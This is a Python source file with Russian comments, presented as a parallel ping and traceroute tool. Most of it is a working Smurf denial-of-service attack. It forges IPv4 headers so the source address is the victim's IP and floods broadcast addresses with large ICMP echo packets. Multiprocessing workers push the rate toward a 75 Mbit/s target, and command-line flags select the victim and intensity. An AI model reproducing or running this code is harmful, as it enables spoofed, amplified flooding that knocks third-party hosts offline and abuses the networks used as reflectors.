import socket
import struct
import time
import threading
import select
import os
import sys
from typing import List, Dict, Tuple, Optional
import argparse
from dataclasses import dataclass
from enum import Enum
import multiprocessing


class PacketType(Enum):
    PING_REPLY = 0
    TTL_EXCEEDED = 11
    HOST_UNREACHABLE = 3


@dataclass
class PingResult:
    host: str
    success: bool
    rtt: float
    ttl: int
    error_message: str = ""


@dataclass
class TraceHop:
    hop_number: int
    host: str
    ip: str
    rtt: float
    success: bool


class ICMPPacket:
    @staticmethod
    def checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'

        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]

        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF

    @staticmethod
    def create_ping_packet(packet_id: int, sequence: int, timestamp: float, size: int = 64) -> bytes:
        header = struct.pack('!BBHHH', 8, 0, 0, packet_id, sequence)

        # Увеличиваем размер пакета для большей нагрузки
        data_size = size - 8  # Вычитаем размер заголовка ICMP
        if data_size < 8:
            data_size = 8

        data = struct.pack('!d', timestamp) + b'X' * (data_size - 8)

        packet = header + data
        checksum = ICMPPacket.checksum(packet)

        header = struct.pack('!BBHHH', 8, 0, checksum, packet_id, sequence)
        return header + data

    @staticmethod
    def parse_icmp_packet(packet: bytes) -> Tuple[int, int, int, float]:
        ip_header_len = (packet[0] & 0xF) * 4
        icmp_packet = packet[ip_header_len:]

        if len(icmp_packet) < 8:
            return 0, 0, 0, 0.0

        icmp_type, code, _, packet_id, sequence = struct.unpack('!BBHHH', icmp_packet[:8])

        timestamp = 0.0
        if len(icmp_packet) >= 16:
            try:
                timestamp = struct.unpack('!d', icmp_packet[8:16])[0]
            except:
                pass

        return icmp_type, code, packet_id, timestamp


class SmurfAttackWorker(multiprocessing.Process):
    """Отдельный процесс для высокоинтенсивной Smurf атаки"""

    def __init__(self, broadcast_ips: List[str], target_ip: str, packet_size: int = 1024,
                 duration: int = 30, worker_id: int = 0):
        super().__init__()
        self.broadcast_ips = broadcast_ips
        self.target_ip = target_ip
        self.packet_size = packet_size
        self.duration = duration
        self.worker_id = worker_id
        self.packets_sent = 0
        self.bytes_sent = 0

    def create_ip_header(self, dest_ip: str, payload_len: int) -> bytes:
        version_ihl = (4 << 4) + 5  # IPv4, header length 20 bytes
        tos = 0
        total_len = 20 + payload_len  # IP header + ICMP
        packet_id = (os.getpid() + self.worker_id) & 0xFFFF
        flags_fragment = 0
        ttl = 64
        protocol = socket.IPPROTO_ICMP
        checksum = 0
        source_ip = socket.inet_aton(self.target_ip)  # Подделанный источник
        dest_ip_bytes = socket.inet_aton(dest_ip)

        header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_len, packet_id,
                             flags_fragment, ttl, protocol, checksum,
                             source_ip, dest_ip_bytes)

        checksum = ICMPPacket.checksum(header)
        header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_len, packet_id,
                             flags_fragment, ttl, protocol, checksum,
                             source_ip, dest_ip_bytes)
        return header

    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            # Убираем таймаут для максимальной скорости
            sock.setblocking(False)
        except PermissionError:
            print(f"Worker {self.worker_id}: Нужны права суперпользователя")
            return

        print(f"Worker {self.worker_id}: Начинаю Smurf атаку на {len(self.broadcast_ips)} broadcast адресов")

        start_time = time.time()
        sequence = 0

        # Предварительно создаем пакеты для экономии времени
        prepared_packets = {}
        for broadcast_ip in self.broadcast_ips:
            icmp_packet = ICMPPacket.create_ping_packet(
                (os.getpid() + self.worker_id) & 0xFFFF,
                sequence,
                time.time(),
                self.packet_size
            )
            ip_header = self.create_ip_header(broadcast_ip, len(icmp_packet))
            prepared_packets[broadcast_ip] = ip_header + icmp_packet

        try:
            while time.time() - start_time < self.duration:
                for broadcast_ip in self.broadcast_ips:
                    try:
                        # Отправляем без задержек
                        sock.sendto(prepared_packets[broadcast_ip], (broadcast_ip, 0))
                        self.packets_sent += 1
                        self.bytes_sent += len(prepared_packets[broadcast_ip])

                        # Обновляем timestamp в пакете каждые 1000 пакетов
                        if self.packets_sent % 1000 == 0:
                            sequence += 1
                            icmp_packet = ICMPPacket.create_ping_packet(
                                (os.getpid() + self.worker_id) & 0xFFFF,
                                sequence,
                                time.time(),
                                self.packet_size
                            )
                            ip_header = self.create_ip_header(broadcast_ip, len(icmp_packet))
                            prepared_packets[broadcast_ip] = ip_header + icmp_packet

                    except socket.error:
                        # Игнорируем ошибки сокета для максимальной скорости
                        continue

        except KeyboardInterrupt:
            pass
        finally:
            sock.close()

        elapsed_time = time.time() - start_time
        mbps = (self.bytes_sent * 8) / (elapsed_time * 1024 * 1024)

        print(f"Worker {self.worker_id}: Отправлено {self.packets_sent} пакетов, "
              f"{self.bytes_sent / 1024 / 1024:.2f} МБ за {elapsed_time:.2f}с "
              f"({mbps:.2f} Мбит/с)")


class PingThread(threading.Thread):
    def __init__(self, host: str, count: int = 4, timeout: int = 5,
                 smurf_mode: bool = False, target_ip: str = None,
                 smurf_intensity: str = "normal"):
        super().__init__()
        self.host = host
        self.count = count
        self.timeout = timeout
        self.smurf_mode = smurf_mode
        self.target_ip = target_ip
        self.smurf_intensity = smurf_intensity
        self.results: List[PingResult] = []
        self.packet_id = os.getpid() & 0xFFFF
        self.socket = None

    def create_socket(self) -> socket.socket:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

            if not self.smurf_mode or self.smurf_intensity == "normal":
                sock.settimeout(self.timeout)

            if self.smurf_mode and self.target_ip:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

            return sock
        except PermissionError:
            print(f"Ошибка: нужны права суперпользователя для создания raw сокета")
            sys.exit(1)

    def create_ip_header(self, dest_ip: str, payload_len: int) -> bytes:
        if not self.smurf_mode or not self.target_ip:
            return b''

        version_ihl = (4 << 4) + 5  # IPv4, header length 20 bytes
        tos = 0
        total_len = 20 + payload_len  # IP header + ICMP
        packet_id = 54321
        flags_fragment = 0
        ttl = 64
        protocol = socket.IPPROTO_ICMP
        checksum = 0
        source_ip = socket.inet_aton(self.target_ip)  # Подделанный источник
        dest_ip_bytes = socket.inet_aton(dest_ip)

        header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_len, packet_id,
                             flags_fragment, ttl, protocol, checksum,
                             source_ip, dest_ip_bytes)

        checksum = ICMPPacket.checksum(header)
        header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_len, packet_id,
                             flags_fragment, ttl, protocol, checksum,
                             source_ip, dest_ip_bytes)
        return header

    def receive_with_peek(self, sock: socket.socket) -> Optional[bytes]:
        try:
            ready, _, _ = select.select([sock], [], [], self.timeout)
            if not ready:
                return None

            packet = sock.recv(1024, socket.MSG_PEEK)
            if not packet:
                return None

            try:
                icmp_type, code, packet_id, _ = ICMPPacket.parse_icmp_packet(packet)
                if packet_id == self.packet_id:
                    return sock.recv(1024)
                else:
                    # Убираем задержку для высокоинтенсивной атаки
                    if self.smurf_mode and self.smurf_intensity == "high":
                        pass
                    else:
                        time.sleep(0.01)
                    return None
            except:
                sock.recv(1024)
                return None

        except socket.timeout:
            return None
        except Exception as e:
            if self.smurf_intensity != "high":
                print(f"Ошибка при получении пакета: {e}")
            return None

    def ping_host(self, sequence: int) -> PingResult:
        try:
            dest_ip = socket.gethostbyname(self.host)
        except socket.gaierror:
            return PingResult(self.host, False, 0.0, 0, "Не удалось разрешить имя хоста")

        sock = self.create_socket()

        try:
            timestamp = time.time()
            # Увеличиваем размер пакета для smurf атаки
            packet_size = 1024 if self.smurf_mode else 64
            icmp_packet = ICMPPacket.create_ping_packet(self.packet_id, sequence, timestamp, packet_size)

            if self.smurf_mode and self.target_ip:
                ip_header = self.create_ip_header(dest_ip, len(icmp_packet))
                packet = ip_header + icmp_packet
                if self.smurf_intensity != "high":
                    print(f"[Smurf] Отправка пакета с поддельным источником {self.target_ip} -> {dest_ip}")
            else:
                packet = icmp_packet

            sock.sendto(packet, (dest_ip, 0))

            # Для высокоинтенсивной атаки пропускаем ожидание ответа
            if self.smurf_mode and self.smurf_intensity == "high":
                return PingResult(self.host, True, 0.0, 64, "High-intensity mode")

            start_time = time.time()
            while time.time() - start_time < self.timeout:
                response = self.receive_with_peek(sock)
                if response:
                    icmp_type, code, resp_id, sent_timestamp = ICMPPacket.parse_icmp_packet(response)

                    if resp_id == self.packet_id:
                        rtt = (time.time() - sent_timestamp) * 1000  # в миллисекундах

                        if icmp_type == PacketType.PING_REPLY.value:
                            return PingResult(self.host, True, rtt, 64, "")
                        elif icmp_type == PacketType.TTL_EXCEEDED.value:
                            return PingResult(self.host, False, rtt, 0, "TTL exceeded")
                        elif icmp_type == PacketType.HOST_UNREACHABLE.value:
                            return PingResult(self.host, False, rtt, 0, "Host unreachable")

            return PingResult(self.host, False, 0.0, 0, "Timeout")

        finally:
            sock.close()

    def run(self):
        if self.smurf_mode and self.smurf_intensity == "high":
            print(f"Высокоинтенсивная Smurf атака на {self.host} с целью {self.target_ip}")

            # Для высокоинтенсивной атаки отправляем пакеты без задержек
            for i in range(self.count * 100):  # Увеличиваем количество пакетов
                result = self.ping_host(i + 1)
                self.results.append(result)

                # Без задержек между пакетами

            print(f"Отправлено {len(self.results)} пакетов в режиме высокой интенсивности")
        else:
            print(f"Ping {self.host} ({self.count} пакетов)...")

            for i in range(self.count):
                result = self.ping_host(i + 1)
                self.results.append(result)

                if result.success:
                    print(f"Reply from {self.host}: time={result.rtt:.2f}ms TTL={result.ttl}")
                else:
                    print(f"Request to {self.host}: {result.error_message}")

                if i < self.count - 1:
                    time.sleep(1)


class Traceroute:

    def __init__(self, host: str, max_hops: int = 30):
        self.host = host
        self.max_hops = max_hops
        self.packet_id = (os.getpid() + 1000) & 0xFFFF

    def traceroute(self) -> List[TraceHop]:
        results = []

        try:
            dest_ip = socket.gethostbyname(self.host)
        except socket.gaierror:
            print(f"Не удалось разрешить имя хоста: {self.host}")
            return results

        print(f"\nTraceroute to {self.host} ({dest_ip}), {self.max_hops} hops max:")

        for ttl in range(1, self.max_hops + 1):
            hop = self.send_probe(dest_ip, ttl)
            results.append(hop)

            if hop.success:
                try:
                    hostname = socket.gethostbyaddr(hop.ip)[0]
                except:
                    hostname = hop.ip

                print(f"{ttl:2d}  {hostname} ({hop.ip})  {hop.rtt:.2f} ms")

                if hop.ip == dest_ip:
                    print("Достигнут узел назначения")
                    break
            else:
                print(f"{ttl:2d}  * * *")

        return results

    def send_probe(self, dest_ip: str, ttl: int) -> TraceHop:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(5)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

        try:
            timestamp = time.time()
            packet = ICMPPacket.create_ping_packet(self.packet_id, ttl, timestamp)

            sock.sendto(packet, (dest_ip, 0))

            response = sock.recv(1024)
            rtt = (time.time() - timestamp) * 1000

            sender_ip = socket.inet_ntoa(response[12:16])

            return TraceHop(ttl, self.host, sender_ip, rtt, True)

        except socket.timeout:
            return TraceHop(ttl, self.host, "", 0.0, False)
        except Exception as e:
            return TraceHop(ttl, self.host, "", 0.0, False)
        finally:
            sock.close()


def run_high_intensity_smurf(broadcast_ips: List[str], target_ip: str,
                             duration: int = 30, target_mbps: float = 75.0):
    """Запуск высокоинтенсивной Smurf атаки с несколькими процессами"""

    # Вычисляем параметры для достижения целевой скорости
    packet_size = 1024  # байт
    target_bytes_per_sec = (target_mbps * 1024 * 1024) / 8  # Мбит/с в байт/с
    packets_per_sec = target_bytes_per_sec / packet_size

    # Используем несколько процессов для увеличения нагрузки
    num_workers = min(multiprocessing.cpu_count(), len(broadcast_ips))
    packets_per_worker = int(packets_per_sec / num_workers)

    print(f"Запуск высокоинтенсивной Smurf атаки:")
    print(f"  Цель: {target_ip}")
    print(f"  Broadcast адресов: {len(broadcast_ips)}")
    print(f"  Процессов: {num_workers}")
    print(f"  Размер пакета: {packet_size} байт")
    print(f"  Целевая скорость: {target_mbps} Мбит/с")
    print(f"  Длительность: {duration} секунд")

    workers = []
    for i in range(num_workers):
        worker_broadcast_ips = broadcast_ips[i::num_workers] if len(broadcast_ips) > num_workers else broadcast_ips
        worker = SmurfAttackWorker(worker_broadcast_ips, target_ip, packet_size, duration, i)
        workers.append(worker)
        worker.start()

    try:
        for worker in workers:
            worker.join()
    except KeyboardInterrupt:
        print("\nПрерывание атаки...")
        for worker in workers:
            if worker.is_alive():
                worker.terminate()


def main():
    parser = argparse.ArgumentParser(description='Программа параллельного ping с функциями traceroute и Smurf')
    parser.add_argument('hosts', nargs='+', help='Список хостов для ping (или broadcast адресов для Smurf)')
    parser.add_argument('-c', '--count', type=int, default=4, help='Количество ping пакетов')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Таймаут в секундах')
    parser.add_argument('--traceroute', action='store_true', help='Выполнить traceroute')
    parser.add_argument('--smurf', action='store_true', help='Выполнить Smurf атаку')
    parser.add_argument('--target', type=str, help='IP адрес цели для Smurf атаки')
    parser.add_argument('--high-intensity', action='store_true', help='Высокоинтенсивная Smurf атака (75 Мбит/с)')
    parser.add_argument('--duration', type=int, default=30, help='Длительность высокоинтенсивной атаки в секундах')
    parser.add_argument('--target-mbps', type=float, default=75.0,
                        help='Целевая скорость для высокоинтенсивной атаки (Мбит/с)')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Эта программа требует права суперпользователя (sudo)")
        sys.exit(1)

    if args.smurf:
        if not args.target:
            print("Для Smurf атаки необходимо указать --target")
            sys.exit(1)

        if args.high_intensity:
            print(f"ВНИМАНИЕ: Запуск высокоинтенсивной Smurf атаки ({args.target_mbps} Мбит/с) с целью {args.target}")
            print("Нажмите Ctrl+C для остановки")

            # Высокоинтенсивная атака с помощью multiprocessing
            run_high_intensity_smurf(args.hosts, args.target, args.duration, args.target_mbps)
            return
        else:
            print(f"ВНИМАНИЕ: Выполняется обычная Smurf атака с целью {args.target}")

    intensity = "high" if args.high_intensity else "normal"

    threads = []
    for host in args.hosts:
        thread = PingThread(host, args.count, args.timeout, args.smurf, args.target, intensity)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if not args.high_intensity:
        print("\n" + "=" * 50)
        print("СТАТИСТИКА PING:")
        print("=" * 50)

        for thread in threads:
            successful = sum(1 for r in thread.results if r.success)
            total = len(thread.results)
            loss_percent = ((total - successful) / total) * 100 if total > 0 else 0

            if successful > 0:
                rtts = [r.rtt for r in thread.results if r.success and r.rtt > 0]
                if rtts:
                    min_rtt = min(rtts)
                    max_rtt = max(rtts)
                    avg_rtt = sum(rtts) / len(rtts)
                else:
                    min_rtt = max_rtt = avg_rtt = 0
            else:
                min_rtt = max_rtt = avg_rtt = 0

            print(f"\n{thread.host}:")
            print(
                f"  Пакетов: отправлено = {total}, получено = {successful}, потеряно = {total - successful} ({loss_percent:.1f}% потерь)")
            if successful > 0 and min_rtt > 0:
                print(f"  Время RTT мс: минимум = {min_rtt:.2f}, максимум = {max_rtt:.2f}, среднее = {avg_rtt:.2f}")

    if args.traceroute:
        for host in args.hosts:
            tracer = Traceroute(host)
            tracer.traceroute()


if __name__ == "__main__":
    main()